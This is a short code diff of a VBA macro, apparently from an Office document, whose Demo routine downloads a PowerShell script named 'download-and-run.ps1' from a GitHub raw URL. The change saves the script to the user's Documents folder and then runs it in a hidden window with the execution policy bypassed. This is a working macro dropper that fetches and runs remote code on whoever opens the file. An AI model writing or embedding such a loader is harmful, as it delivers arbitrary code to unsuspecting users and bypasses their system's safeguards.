@@ -1,14 +1,18 @@
 Sub Demo()
 ' main entry
     Dim fileURL As String, saveLocation As String
-    Dim ret As Integer
-    
-    fileURL = "https://raw.githubusercontent.com/turvas/ps_test/master/download-and-run.ps1"
-    saveLocation = "testfile.ps1"
-    DownloadFile fileURL, saveLocation
     Dim RetVal
-    RetVal = Shell("powershell -executionpolicy bypass -noexit -file " & saveLocation, vbHide)
+    Dim User, UserDocPath As String
     
+    User = Environ("USERNAME")
+    UserDocPath = "/Users/" & User & "/Documents/"
+    saveLocation = UserDocPath & "testfile.ps1"
+    fileURL = "https://raw.githubusercontent.com/turvas/ps_test/master/download-and-run.ps1"
+
+    DownloadFile fileURL, saveLocation
+
+    RetVal = Shell("powershell -executionpolicy bypass -noexit -file " & saveLocation, vbHide)
+ 
 End Sub
 
 Sub DownloadFile(url As String, filePath As String)
